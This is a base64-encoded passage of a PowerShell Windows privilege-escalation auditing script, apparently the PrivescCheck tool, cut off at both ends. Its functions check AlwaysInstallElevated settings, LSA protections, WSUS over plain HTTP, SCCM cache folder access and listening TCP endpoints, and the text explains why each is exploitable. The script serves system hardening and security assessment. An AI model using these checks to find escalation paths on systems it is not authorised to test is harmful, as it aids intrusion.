NcSW5zdGFsbGVyIgoKICAgIGlmIChUZXN0LVBhdGggLVBhdGggIlJlZ2lzdHJ5OjokUmVnUGF0aCIgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWUpIHsKCiAgICAgICAgJEhLTE12YWwgPSBHZXQtSXRlbVByb3BlcnR5IC1QYXRoICJSZWdpc3RyeTo6JFJlZ1BhdGgiIC1OYW1lIEFsd2F5c0luc3RhbGxFbGV2YXRlZCAtRXJyb3JBY3Rpb24gU2lsZW50bHlDb250aW51ZQogICAgICAgIGlmICgkSEtMTXZhbC5BbHdheXNJbnN0YWxsRWxldmF0ZWQgLWFuZCAoJEhLTE12YWwuQWx3YXlzSW5zdGFsbEVsZXZhdGVkIC1uZSAwKSl7CiAgICAgICAgICAgICRJdGVtID0gTmV3LU9iamVjdCAtVHlwZU5hbWUgUFNPYmplY3QgCiAgICAgICAgICAgICRJdGVtIHwgQWRkLU1lbWJlciAtTWVtYmVyVHlwZSAiTm90ZVByb3BlcnR5IiAtTmFtZSAiTmFtZSIgLVZhbHVlICRSZWdQYXRoCiAgICAgICAgICAgICRJdGVtIHwgQWRkLU1lbWJlciAtTWVtYmVyVHlwZSAiTm90ZVByb3BlcnR5IiAtTmFtZSAiQWx3YXlzSW5zdGFsbEVsZXZhdGVkIiAtVmFsdWUgJEhLTE12YWwuQWx3YXlzSW5zdGFsbEVsZXZhdGVkIAogICAgICAgICAgICAkSXRlbSB8IEFkZC1NZW1iZXIgLU1lbWJlclR5cGUgIk5vdGVQcm9wZXJ0eSIgLU5hbWUgIkVuYWJsZWQiIC1WYWx1ZSAkVHJ1ZQogICAgICAgICAgICBbdm9pZF0kUmVzdWx0LkFkZCgkSXRlbSkKICAgICAgICB9CgogICAgICAgICRSZWdQYXRoID0gIkhLRVlfQ1VSUkVOVF9VU0VSXFNPRlRXQVJFXFBvbGljaWVzXE1pY3Jvc29mdFxXaW5kb3dzXEluc3RhbGxlciIKCiAgICAgICAgaWYgKFRlc3QtUGF0aCAtUGF0aCAiUmVnaXN0cnk6OiRSZWdQYXRoIiAtRXJyb3JBY3Rpb24gU2lsZW50bHlDb250aW51ZSkgewoKICAgICAgICAgICAgJEhLQ1V2YWwgPSAoR2V0LUl0ZW1Qcm9wZXJ0eSAtUGF0aCAiUmVnaXN0cnk6OiRSZWdQYXRoIiAtTmFtZSBBbHdheXNJbnN0YWxsRWxldmF0ZWQgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWUpCiAgICAgICAgICAgIGlmICgkSEtDVXZhbC5BbHdheXNJbnN0YWxsRWxldmF0ZWQgLWFuZCAoJEhLQ1V2YWwuQWx3YXlzSW5zdGFsbEVsZXZhdGVkIC1uZSAwKSl7CiAgICAgICAgICAgICAgICAkSXRlbSA9IE5ldy1PYmplY3QgLVR5cGVOYW1lIFBTT2JqZWN0CiAgICAgICAgICAgICAgICAkSXRlbSB8IEFkZC1NZW1iZXIgLU1lbWJlclR5cGUgIk5vdGVQcm9wZXJ0eSIgLU5hbWUgIk5hbWUiIC1WYWx1ZSAkUmVnUGF0aAogICAgICAgICAgICAgICAgJEl0ZW0gfCBBZGQtTWVtYmVyIC1NZW1iZXJUeXBlICJOb3RlUHJvcGVydHkiIC1OYW1lICJBbHdheXNJbnN0YWxsRWxldmF0ZWQiIC1WYWx1ZSAkSEtMTXZhbC5BbHdheXNJbnN0YWxsRWxldmF0ZWQgCiAgICAgICAgICAgICAgICAkSXRlbSB8IEFkZC1NZW1iZXIgLU1lbWJlclR5cGUgIk5vdGVQcm9wZXJ0eSIgLU5hbWUgIkVuYWJsZWQiIC1WYWx1ZSAkVHJ1ZQogICAgICAgICAgICAgICAgW3ZvaWRdJFJlc3VsdC5BZGQoJEl0ZW0pCgogICAgICAgICAgICAgICAgJFJlc3VsdAogICAgICAgICAgICB9CiAgICAgICAgfSAKICAgIH0KfQoKZnVuY3Rpb24gSW52b2tlLUxzYVByb3RlY3Rpb25zQ2hlY2sgewogICAgPCMKICAgIC5TWU5PUFNJUwoKICAgIENoZWNrcyB3aGV0aGVyIExTQVNTIGlzIGNvbmZpZ3VyZWQgdG8gcnVuIGFzIGEgUHJvdGVjdGVkIFByb2Nlc3MgCgogICAgQXV0aG9yOiBAaXRtNG4KICAgIExpY2Vuc2U6IEJTRCAzLUNsYXVzZQogICAgCiAgICAuREVTQ1JJUFRJT04KCiAgICBGaXJzdCBpdCByZWFkcyB0aGUgcmVnaXN0cnkgdG8gY2hlY2sgd2hldGhlciAiUnVuQXNQUEwiIGlzIGNvbmZpZ3VyZWQgYW5kIGVuYWJsZWQgaW4gdGhlCiAgICAiTFNBIiBrZXkuIEl0IGFsc28gY2hlY2tzIHdoZXRoZXIgYWRkaXRpb25hbCBwcm90ZWN0aW9ucyBzdWNoIGFzIFNlY3VyZSBCb290IG9yIENyZWRlbnRpYWwKICAgIEd1YXJkIGFyZSBjb25maWd1cmVkIC8gZW5hYmxlZC4gCiAgICAKICAgIC5FWEFNUExFCgogICAgT24gV2luZG93cyAxMDoKCiAgICBQUyBDOlw+IEludm9rZS1Mc2FQcm90ZWN0aW9uc0NoZWNrCgogICAgTmFtZSAgICAgICAgICAgICBTdGF0dXMgRGVzY3JpcHRpb24KICAgIC0tLS0gICAgICAgICAgICAgLS0tLS0tIC0tLS0tLS0tLS0tCiAgICBSdW5Bc1BQTCAgICAgICAgICAgVHJ1ZSBSdW5Bc1BQTCBpcyBlbmFibGVkCiAgICBVRUZJICAgICAgICAgICAgICAgVHJ1ZSBCSU9TIG1vZGUgaXMgVUVGSQogICAgU2VjdXJlIEJvb3QgICAgICAgIFRydWUgU2VjdXJlIEJvb3QgaXMgZW5hYmxlZAogICAgQ3JlZGVudGlhbCBHdWFyZCAgRmFsc2UgQ3JlZGVudGlhbCBHdWFyZCBpcyBub3QgY29uZmlndXJlZAogICAgCiAgICAuRVhBTVBMRQoKICAgIE9uIFdpbmRvd3MgU2VydmVyIDIwMTIgUjI6CgogICAgUFMgQzpcPiBJbnZva2UtTHNhUHJvdGVjdGlvbnNDaGVjawoKICAgIE5hbWUgICAgICAgICAgICAgU3RhdHVzIERlc2NyaXB0aW9uCiAgICAtLS0tICAgICAgICAgICAgIC0tLS0tLSAtLS0tLS0tLS0tLQogICAgUnVuQXNQUEwgICAgICAgICAgRmFsc2UgUnVuQXNQUEwgaXMgbm90IGNvbmZpZ3VyZWQKICAgIFVFRkkgICAgICAgICAgICAgIEZhbHNlIEJJT1MgbW9kZSBpcyBMZWdhY3kKICAgIFNlY3VyZSBCb290ICAgICAgIEZhbHNlIFNlY3VyZSBCb290IGlzIG5vdCBzdXBwb3J0ZWQKICAgIENyZWRlbnRpYWwgR3VhcmQgIEZhbHNlIENyZWRlbnRpYWwgR3VhcmQgaXMgbm90IHN1cHBvcnRlZCBvbiB0aGlzIE9TCgogICAgIz4KICAgIAogICAgW0NtZGxldEJpbmRpbmcoKV1QYXJhbSgpCgogICAgR2V0LUxzYVJ1bkFzUFBMU3RhdHVzCiAgICBHZXQtVUVGSVN0YXR1cwogICAgR2V0LVNlY3VyZUJvb3RTdGF0dXMKICAgIEdldC1DcmVkZW50aWFsR3VhcmRTdGF0dXMKCn0KCmZ1bmN0aW9uIEludm9rZS1Xc3VzQ29uZmlnQ2hlY2sgewogICAgPCMKICAgIC5TWU5PUFNJUwogICAgCiAgICBDaGVja3Mgd2hldGhlciB0aGUgV1NVUyBpcyBlbmFibGVkIGFuZCB2dWxuZXJhYmxlIChXc3V4cGxvaXQpCgogICAgQXV0aG9yOiBAaXRtNG4KICAgIExpY2Vuc2U6IEJTRCAzLUNsYXVzZQogICAgCiAgICAuREVTQ1JJUFRJT04KICAgIAogICAgQSBzeXN0ZW0gY2FuIGJlIGNvbXByb21pc2VkIGlmIHRoZSB1cGRhdGVzIGFyZSBub3QgcmVxdWVzdGVkIHVzaW5nIEhUVFBTIGJ1dCBIVFRQLiBJZiB0aGUgVVJMCiAgICBvZiB0aGUgdXBkYXRlIHNlcnZlciAoV1VTZXJ2ZXIpIHN0YXJ0cyB3aXRoIEhUVFAgYW5kIFVzZVdVU2VydmVyPTEsIHRoZW4gdGhlIHVwZGF0ZSByZXF1ZXN0cyAKICAgIGFyZSB2dWxuZXJhYmxlIHRvIE1JVE0gYXR0YWNrcy4KICAgIAogICAgLkVYQU1QTEUKICAgIAogICAgUFMgQzpcPiBJbnZva2UtV3N1c0NvbmZpZ0NoZWNrCgogICAgV1VTZXJ2ZXIgICAgIDogaHR0cDovL2FjbWUtdXBkMDEuY29ycC5pbnRlcm5hbC5jb206ODUzNQogICAgVXNlV1VTZXJ2ZXIgIDogMQogICAgCiAgICAuTElOSwoKICAgIGh0dHBzOi8vYm9vay5oYWNrdHJpY2tzLnh5ei93aW5kb3dzL3dpbmRvd3MtbG9jYWwtcHJpdmlsZWdlLWVzY2FsYXRpb24jd3N1cwogICAgaHR0cHM6Ly9naXRodWIuY29tL3BpbXBzL3dzdXhwbG9pdAogICAgIz4KCiAgICAkV2luZG93c1VwZGF0ZVJlZ1BhdGggPSAiSEtMTVxTb2Z0d2FyZVxQb2xpY2llc1xNaWNyb3NvZnRcV2luZG93c1xXaW5kb3dzVXBkYXRlIgogICAgJFdpbmRvd3NVcGRhdGVBVVJlZ1BhdGggPSAiSEtMTVxTb2Z0d2FyZVxQb2xpY2llc1xNaWNyb3NvZnRcV2luZG93c1xXaW5kb3dzVXBkYXRlXEFVIgoKICAgICRXc3VzS2V5U2VydmVyVmFsdWUgPSBHZXQtSXRlbVByb3BlcnR5IC1QYXRoICJSZWdpc3RyeTo6JCgkV2luZG93c1VwZGF0ZVJlZ1BhdGgpIiAtTmFtZSBXVVNlcnZlciAtRXJyb3JBY3Rpb24gU2lsZW50bHlDb250aW51ZSAtRXJyb3JWYXJpYWJsZSBFcnJvckdldEl0ZW1Qcm9wZXJ0eQogICAgaWYgKC1ub3QgJEVycm9yR2V0SXRlbVByb3BlcnR5KSB7CgogICAgICAgICRXdXNVcmwgPSAkV3N1c0tleVNlcnZlclZhbHVlLldVU2VydmVyCgogICAgICAgICRVc2VXVVNlcnZlclZhbHVlID0gR2V0LUl0ZW1Qcm9wZXJ0eSAtUGF0aCAiUmVnaXN0cnk6OiQoJFdpbmRvd3NVcGRhdGVBVVJlZ1BhdGgpIiAtTmFtZSBVc2VXVVNlcnZlciAtRXJyb3JBY3Rpb24gU2lsZW50bHlDb250aW51ZSAtRXJyb3JWYXJpYWJsZSBFcnJvckdldEl0ZW1Qcm9wZXJ0eQogICAgICAgIGlmICgtbm90ICRFcnJvckdldEl0ZW1Qcm9wZXJ0eSkgewoKICAgICAgICAgICAgJFd1c0VuYWJsZWQgPSAkVXNlV1VTZXJ2ZXJWYWx1ZS5Vc2VXVVNlcnZlcgogICAgICAgICAgICAKICAgICAgICAgICAgaWYgKCRXdXNVcmwgLUxpa2UgImh0dHA6Ly8qIiAtYW5kICRXdXNFbmFibGVkIC1lcSAxKSB7CiAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICRSZXN1bHQgPSBOZXctT2JqZWN0IC1UeXBlTmFtZSBQU09iamVjdAogICAgICAgICAgICAgICAgJFJlc3VsdCB8IEFkZC1NZW1iZXIgLU1lbWJlclR5cGUgIk5vdGVQcm9wZXJ0eSIgLU5hbWUgIldVU2VydmVyIiAtVmFsdWUgJFd1c1VybAogICAgICAgICAgICAgICAgJFJlc3VsdCB8IEFkZC1NZW1iZXIgLU1lbWJlclR5cGUgIk5vdGVQcm9wZXJ0eSIgLU5hbWUgIlVzZVdVU2VydmVyIiAtVmFsdWUgJFd1c0VuYWJsZWQKICAgICAgICAgICAgICAgICRSZXN1bHQKICAgICAgICAgICAgfSAKICAgICAgICB9CiAgICB9Cn0KCmZ1bmN0aW9uIEludm9rZS1TY2NtQ2FjaGVGb2xkZXJDaGVjayB7CiAgICA8IwogICAgLlNZTk9QU0lTCiAgICAKICAgIEdldHMgc29tZSBpbmZvcm1hdGlvbiBhYm91dCB0aGUgU0NDTSBjYWNoZSBmb2xkZXIgaWYgaXQgZXhpc3RzLgoKICAgIEF1dGhvcjogQGl0bTRuCiAgICBMaWNlbnNlOiBCU0QgMy1DbGF1c2UKICAgIAogICAgLkRFU0NSSVBUSU9OCgogICAgSWYgdGhlIFNDQ00gY2FjaGUgZm9sZGVyIGV4aXN0cyAoJ0M6XFdpbmRvd3NcQ0NNQ2FjaGUnKSwgdGhpcyBjaGVjayB3aWxsIHJldHVybiBzb21lIGluZm9ybWF0aW9uCiAgICBhYm91dCB0aGUgaXRlbSwgc3VjaCBhcyB0aGUgQUNMLiBUaGlzIGFsbG93cyBmb3IgZnVydGhlciBtYW51YWwgYW5hbHlzaXMuCiAgICAKICAgIC5FWEFNUExFCgogICAgVE9ETwogICAgCiAgICAjPgoKICAgIFtDbWRsZXRCaW5kaW5nKCldIHBhcmFtICgpCgogICAgJFNjY21DYWNoZUZvbGRlckl0ZW0gPSBHZXQtU2NjbUNhY2hlRm9sZGVyCiAgICBpZiAoJFNjY21DYWNoZUZvbGRlckl0ZW0pIHsKCiAgICAgICAgJFJlc3VsdCA9ICRTY2NtQ2FjaGVGb2xkZXJJdGVtCiAgICAgICAgdHJ5IHsKICAgICAgICAgICAgIyBXZSBuZWVkIGEgdHJ5L2NhdGNoIGJsb2NrIGJlY2F1c2UgRXJyb3JBY3Rpb24gZG9lc24ndCBjYXRjaCBhY2Nlc3MgZGVuaWVkIGVycm9ycwogICAgICAgICAgICAkUmVzdWx0IHwgQWRkLU1lbWJlciAtTWVtYmVyVHlwZSAiTm90ZVByb3BlcnR5IiAtTmFtZSAiQWNsIiAtVmFsdWUgJCgkU2NjbUNhY2hlRm9sZGVySXRlbSB8IEdldC1BY2wgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWUgfCBTZWxlY3QtT2JqZWN0IC1FeHBhbmRQcm9wZXJ0eSBBY2Nlc3NUb1N0cmluZykgCiAgICAgICAgfSBjYXRjaCB7CiAgICAgICAgICAgICMgQWNjZXNzIGRlbmllZCwgZG8gbm90aGluZwogICAgICAgIH0KICAgICAgICAkUmVzdWx0CiAgICB9Cn0KCmZ1bmN0aW9uIEludm9rZS1TY2NtQ2FjaGVGb2xkZXJWdWxuQ2hlY2sgewogICAgPCMKICAgIC5TWU5PUFNJUwoKICAgIENoZWNrcyB3aGV0aGVyIHRoZSBjY21jYWNoZSBmb2xkZXIgaXMgYWNjZXNzaWJsZS4KCiAgICBBdXRob3I6IEBpdG00bgogICAgTGljZW5zZTogQlNEIDMtQ2xhdXNlCiAgICAKICAgIC5ERVNDUklQVElPTgoKICAgIFdoZW4gU0NDTSBpcyB1c2VkIHRvIHJlbW90ZWx5IGluc3RhbGwgcGFja2FnZXMsIGEgY2FjaGUgZm9sZGVyIGlzIGNyZWF0ZWQgaW4gdGhlIFdpbmRvd3MgCiAgICBkaXJlY3Rvcnk6ICdDOlxXaW5kb3dzXGNjbWNhY2hlJy4gTVNJIHBhY2thZ2VzIGNvbnRhaW5lZCBpbiB0aGlzIGZvbGRlciBtYXkgY29udGFpbiBzb21lCiAgICBjbGVhcnRleHQgY3JlZGVudGlhbHMuIFRoZXJlZm9yZSwgbm9ybWFsIHVzZXJzIHNob3VsZG4ndCBiZSBhbGxvd2VkIHRvIGJyb3dzZSB0aGlzIAogICAgZGlyZWN0b3J5LgogICAgCiAgICAuRVhBTVBMRQoKICAgIFBTIEM6XD4gSW52b2tlLVNjY21DYWNoZUZvbGRlclZ1bG5DaGVjawoKICAgIEZ1bGxOYW1lICAgOiBDOlxXSU5ET1dTXENDTUNhY2hlCiAgICBBdHRyaWJ1dGVzIDogRGlyZWN0b3J5CiAgICBFeGlzdHMgICAgIDogVHJ1ZQogICAgCiAgICAjPgoKICAgIFtDbWRsZXRCaW5kaW5nKCldIHBhcmFtICgpCgogICAgJFNjY21DYWNoZUZvbGRlciA9IEdldC1TY2NtQ2FjaGVGb2xkZXIKICAgIGlmICgkU2NjbUNhY2hlRm9sZGVyKSB7CgogICAgICAgIEdldC1DaGlsZEl0ZW0gLVBhdGggJFNjY21DYWNoZUZvbGRlci5GdWxsTmFtZSAtRXJyb3JBY3Rpb24gU2lsZW50bHlDb250aW51ZSAtRXJyb3JWYXJpYWJsZSBFcnJvckdldENoaWxkSXRlbSB8IE91dC1OdWxsCiAgICAgICAgaWYgKC1ub3QgJEVycm9yR2V0Q2hpbGRJdGVtKSB7CiAgICAgICAgICAgICRTY2NtQ2FjaGVGb2xkZXIKICAgICAgICB9CiAgICB9Cn0KIyAtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCiMgRU5EIENPTkZJRyAgIAojIC0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0KCgojIC0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0KIyBCRUdJTiBORVRXT1JLIAojIC0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0KZnVuY3Rpb24gR2V0LVJwY1JhbmdlIHsKICAgIDwjCiAgICAuU1lOT1BTSVMKCiAgICBIZWxwZXIgLSBEeW5hbWljYWxseSBpZGVudGlmaWVzIHRoZSByYW5nZSBvZiByYW5kb21pemVkIFJQQyBwb3J0cyBmcm9tIGEgbGlzdCBvZiBwb3J0cy4KCiAgICBBdXRob3I6IEBpdG00bgogICAgTGljZW5zZTogQlNEIDMtQ2xhdXNlCiAgICAKICAgIC5ERVNDUklQVElPTgoKICAgIFRoaXMgZnVuY3Rpb24gaXMgYSBoZWxwZXIgZm9yIHRoZSBJbnZva2UtVGNwRW5kcG9pbnRzQ2hlY2sgZnVuY3Rpb24uIFdpbmRvd3MgdXNlcyBhIHNldCBvZiAKICAgIFJQQyBwb3J0cyB0aGF0IGFyZSByYW5kb21seSBhbGxvY2F0ZWQgaW4gdGhlIHJhbmdlIDQ5MTUyLTY1NTM1IGJ5IGRlZmF1bHQuIElmIHdlIHdhbnQgdG8gCiAgICBmaWx0ZXIgb3V0IHRoZXNlIGxpc3RlbmluZyBwb3J0cyB3ZSBtdXN0IGZpcnN0IGZpZ3VyZSBvdXQgdGhpcyBzZXQgb2YgcG9ydHMuIFRoZSBhaW0gb2YgdGhpcyAKICAgIGZ1bmN0aW9uIGlzIHRvIGd1ZXNzIHRoaXMgcmFuZ2UgdXNpbmcgYmFzaWMgc3RhdGlzdGljcyBvbiBhIGdpdmVuIGFycmF5IG9mIHBvcnQgbnVtYmVycy4gV2UgCiAgICBjYW4gcXVpdGUgcmVsaWFibHkgaWRlbnRpZnkgdGhlIFJQQyBwb3J0IHNldCBiZWNhdXNlIHRoZXkgYXJlIGNvbmNlbnRyYXRlZCBpbiBhIHZlcnkgc21hbGwgCiAgICByYW5nZS4gSXQncyBub3QgMTAwJSByZWxpYWJsZSBidXQgaXQgd2lsbCBkbyB0aGUgam9iIG1vc3Qgb2YgdGhlIHRpbWUuCiAgICAKICAgIC5QQVJBTUVURVIgUG9ydHMKCiAgICBBbiBhcnJheSBvZiBwb3J0IG51bWJlcnMKICAgIAogICAgLkVYQU1QTEUKCiAgICBQUyBDOlw+IEdldC1ScGNSYW5nZSAtUG9ydHMgJFBvcnRzIAoKICAgIE1pblBvcnQgTWF4UG9ydAogICAgLS0tLS0tLSAtLS0tLS0tCiAgICA0OTY2NCAgIDQ5NjcyCiAgICAKICAgICM+CgogICAgW0NtZGxldEJpbmRpbmcoKV1QYXJhbSgKICAgICAgICBbUGFyYW1ldGVyKE1hbmRhdG9yeT0kVHJ1ZSldCiAgICAgICAgW2ludFtdXQogICAgICAgICRQb3J0cwogICAgKQoKICAgIGZ1bmN0aW9uIEdldC1TdGF0cyB7CiAgICAgICAgW0NtZGxldEJpbmRpbmcoKV1QYXJhbSgKICAgICAgICAgICAgW2ludFtdXSRQb3J0cywKICAgICAgICAgICAgW2ludF0kTWluUG9ydCwKICAgICAgICAgICAgW2ludF0kTWF4UG9ydCwKICAgICAgICAgICAgW2ludF0kU3BhbgogICAgICAgICkKCiAgICAgICAgJFN0YXRzID0gQCgpIAogICAgICAgIEZvciAoJGkgPSAkTWluUG9ydDsgJGkgLWx0ICRNYXhQb3J0OyAkaSArPSAkU3BhbikgewogICAgICAgICAgICAkQ291bnRlciA9IDAKICAgICAgICAgICAgRm9yRWFjaCAoJFBvcnQgaW4gJFBvcnRzKSB7CiAgICAgICAgICAgICAgICBpZiAoKCRQb3J0IC1nZSAkaSkgLWFuZCAoJFBvcnQgLWx0ICgkaSArICRTcGFuKSkpIHsKICAgICAgICAgICAgICAgICAgICAkQ291bnRlciArPSAxCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0KICAgICAgICAgICAgJFJhbmdlU3RhdHMgPSBOZXctT2JqZWN0IC1UeXBlTmFtZSBQU09iamVjdCAKICAgICAgICAgICAgJFJhbmdlU3RhdHMgfCBBZGQtTWVtYmVyIC1NZW1iZXJUeXBlICJOb3RlUHJvcGVydHkiIC1OYW1lICJNaW5Qb3J0IiAtVmFsdWUgJGkKICAgICAgICAgICAgJFJhbmdlU3RhdHMgfCBBZGQtTWVtYmVyIC1NZW1iZXJUeXBlICJOb3RlUHJvcGVydHkiIC1OYW1lICJNYXhQb3J0IiAtVmFsdWUgKCRpICsgJFNwYW4pCiAgICAgICAgICAgICRSYW5nZVN0YXRzIHwgQWRkLU1lbWJlciAtTWVtYmVyVHlwZSAiTm90ZVByb3BlcnR5IiAtTmFtZSAiUG9ydHNJblJhbmdlIiAtVmFsdWUgJENvdW50ZXIKICAgICAgICAgICAgJFN0YXRzICs9ICRSYW5nZVN0YXRzIAogICAgICAgIH0KICAgICAgICAkU3RhdHMKICAgIH0KCiAgICAjIFdlIHNwbGl0IHRoZSByYW5nZSA0OTE1Mi02NTUzNiBpbnRvIGJsb2NrcyBvZiBzaXplIDMyIGFuZCB0aGVuLCB3ZSB0YWtlIHRoZSBibG9jayB3aGljaCBoYXMgCiAgICAjIGdyZWF0ZXIgbnVtYmVyIG9mIHBvcnRzIGluIGl0LiAKICAgICRTdGF0cyA9IEdldC1TdGF0cyAtUG9ydHMgJFBvcnRzIC1NaW5Qb3J0IDQ5MTUyIC1NYXhQb3J0IDY1NTM2IC1TcGFuIDMyCgogICAgJE1heFN0YXQgPSAkTnVsbAogICAgRm9yRWFjaCAoJFN0YXQgaW4gJFN0YXRzKSB7CiAgICAgICAgaWYgKCRTdGF0LlBvcnRzSW5SYW5nZSAtZ3QgJE1heFN0YXQuUG9ydHNJblJhbmdlKSB7CiAgICAgICAgICAgICRNYXhTdGF0ID0gJFN0YXQKICAgICAgICB9CiAgICB9IAoKICAgIEZvciAoJGkgPSAwOyAkaSAtbHQgODsgJGkrKykgewogICAgICAgICRTcGFuID0gKCRNYXhTdGF0Lk1heFBvcnQgLSAkTWF4U3RhdC5NaW5Qb3J0KSAvIDIKICAgICAgICAkTmV3U3RhdHMgPSBHZXQtU3RhdHMgLVBvcnRzICRQb3J0cyAtTWluUG9ydCAkTWF4U3RhdC5NaW5Qb3J0IC1NYXhQb3J0ICRNYXhTdGF0Lk1heFBvcnQgLVNwYW4gJFNwYW4KICAgICAgICBpZiAoJE5ld1N0YXRzKSB7CiAgICAgICAgICAgIGlmICgkTmV3U3RhdHNbMF0uUG9ydHNJblJhbmdlIC1lcSAwKSB7CiAgICAgICAgICAgICAgICAkTWF4U3RhdCA9ICROZXdTdGF0c1sxXQogICAgICAgICAgICB9IGVsc2VpZiAoJE5ld1N0YXRzWzFdLlBvcnRzSW5SYW5nZSAtZXEgMCkgewogICAgICAgICAgICAgICAgJE1heFN0YXQgPSAkTmV3U3RhdHNbMF0KICAgICAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgICAgIGJyZWFrIAogICAgICAgICAgICB9CiAgICAgICAgfQogICAgfQoKICAgICRScGNSYW5nZSA9IE5ldy1PYmplY3QgLVR5cGVOYW1lIFBTT2JqZWN0IAogICAgJFJwY1JhbmdlIHwgQWRkLU1lbWJlciAtTWVtYmVyVHlwZSAiTm90ZVByb3BlcnR5IiAtTmFtZSAiTWluUG9ydCIgLVZhbHVlICRNYXhTdGF0Lk1pblBvcnQKICAgICRScGNSYW5nZSB8IEFkZC1NZW1iZXIgLU1lbWJlclR5cGUgIk5vdGVQcm9wZXJ0eSIgLU5hbWUgIk1heFBvcnQiIC1WYWx1ZSAkTWF4U3RhdC5NYXhQb3J0CiAgICAkUnBjUmFuZ2UKfQoKZnVuY3Rpb24gSW52b2tlLVRjcEVuZHBvaW50c0NoZWNrIHsKICAgIDwjCiAgICAuU1lOT1BTSVMKCiAgICBFbnVtZXJhdGVzIGFsbCBUQ1AgZW5kcG9pbnRzIG9uIHRoZSBsb2NhbCBtYWNoaW5lIChJUHY0IGFuZCBJUHY2KQoKICAgIEF1dGhvcjogQGl0bTRuCiAgICBMaWNlbnNlOiBCU0QgMy1DbGF1c2UKICAgIAogICAgLkRFU0NSSVBUSU9OCgogICAgSXQgdXNlcyB0aGUgY3VzdG9tICJHZXQtTmV0d29ya0VuZHBvaW50cyIgZnVuY3Rpb24gdG8gZW51bWVyYXRlIGFsbCB0aGUgVENQIGVuZHBvaW50cyBvbiB0aGUKICAgIGxvY2FsIG1hY2hpbmUsIElQdjQgYW5kIElQdjYuIFRoZSBsaXN0IGNhbiB0aGVuIGJlIGZpbHRlcmVkIGJhc2VkIG9uIGEgbGlzdCBvZiBrbm93biBwb3J0cy4KICAgIAogICAgLlBBUkFNRVRFUiBGaWx0ZXJlZAoKICAgIFVzZSB0aGlzIHN3aXRjaCB0byBmaWx0ZXIgb3V0IHRoZSBsaXN0IG9mIGVuZHBvaW50cyByZXR1cm5lZCBieSB0aGlzIGZ1bmN0aW9uLiBUaGUgZmlsdGVyIAogICAgZXhjbHVkZXMgYWxsIHRoZSBzdGFuZGFyZCBwb3J0cyBzdWNoIGFzIDQ0NSBvciAxMzkgYW5kIGFsbCB0aGUgcmFuZG9tIFJQQyBwb3J0cy4gVGhlIFJQQyBwb3J0CiAgICByYW5nZSBpcyBkeW5hbWljYWxseSBndWVzc2VkIHVzaW5nIHRoZSBoZWxwZXIgZnVuY3Rpb24gIkdldC1ScGNSYW5nZSIuCiAgICAKICAgIC5FWEFNUExFCgogICAgUFMgQzpcPiBJbnZva2UtVGNwRW5kcG9pbnRzQ2hlY2sgfCBmdAoKICAgIElQICAgUHJvdG8gTG9jYWxBZGRyZXNzICAgICAgIFN0YXRlICAgICAgUElEIE5hbWUKICAgIC0tICAgLS0tLS0gLS0tLS0tLS0tLS0tICAgICAgIC0tLS0tICAgICAgLS0tIC0tLS0KICAgIElQdjQgVENQICAgMC4wLjAuMDoxMzUgICAgICAgIExJU1RFTklORyAgOTY4IHN2Y2hvc3QKICAgIElQdjQgVENQICAgMC4wLjAuMDo0NDUgICAgICAgIExJU1RFTklORyAgICA0IFN5c3RlbQogICAgSVB2NCBUQ1AgICAwLjAuMC4wOjUwNDAgICAgICAgTElTVEVOSU5HIDU0MDggc3ZjaG9zdAogICAgSVB2NCBUQ1AgICAwLjAuMC4wOjQ5NjY0ICAgICAgTElTVEVOSU5HICA3MzIgbHNhc3MKICAgIElQdjQgVENQICAgMC4wLjAuMDo0OTY2NSAgICAgIExJU1RFTklORyAgNTY0IHdpbmluaXQKICAgIElQdjQgVENQICAgMC4wLjAuMDo0OTY2NiAgICAgIExJU1RFTklORyAxMjA4IHN2Y2hvc3QKICAgIElQdjQgVENQICAgMC4wLjAuMDo0OTY2NyAgICAgIExJU1RFTklORyAxNDEyIHN2Y2hvc3QKICAgIElQdjQgVENQICAgMC4wLjAuMDo0OTY2OCAgICAgIExJU1RFTklORyAyNDE2IHNwb29sc3YKICAgIElQdjQgVENQICAgMC4wLjAuMDo0OTY2OSAgICAgIExJU1RFTklORyAgNjU2IHNlcnZpY2VzCiAgICBJUHY0IFRDUCAgIDE5Mi4xNjguNzQuMTM2OjEzOSBMSVNURU5JTkcgICAgNCBTeXN0ZW0KICAgIElQdjYgVENQICAgWzo6XToxMzUgICAgICAgICAgIExJU1RFTklORyAgOTY4IHN2Y2hvc3QKICAgIElQdjYgVENQICAgWzo6XTo0NDUgICAgICAgICAgIExJU1RFTklORyAgICA0IFN5c3RlbQogICAgSVB2NiBUQ1AgICBbOjpdOjQ5NjY0ICAgICAgICAgTElTVEVOSU5HICA3MzIgbHNhc3MKICAgIElQdjYgVENQICAgWzo6XTo0OTY2NSAgICAgICAgIExJU1RFTklORyAgNTY0IHdpbmluaXQKICAgIElQdjYgVENQICAgWzo6XTo0OTY2NiAgICAgICAgIExJU1RFTklORyAxMjA4IHN2Y2hvc3QKICAgIElQdjYgVENQICAgWzo6XTo0OTY2NyAgICAgICAgIExJU1RFTklORyAxNDEyIHN2Y2hvc3QKICAgIElQdjYgVENQICAgWzo6XTo0OTY2OCAgICAgICAgIExJU1RFTklORyAyNDE2IHNwb29sc3YKICAgIElQdjYgVENQICAgWzo6XTo0OTY2OSAgICAgICAgIExJU1RFTklORyAgNjU2IHNlcnZpY2VzCiAgICAKICAgICM+CgogICAgW0NtZGxldEJpbmRpbmcoKV1QYXJhbSgKICAgICAgICBbc3dpdGNoXSRGaWx0ZXJlZAogICAgKQoKICAgICRJZ25vcmVkUG9ydHMgPSBAKDEzNSwgMTM5LCA0NDUpCgogICAgJEVuZHBvaW50cyA9IEdldC1OZXR3b3J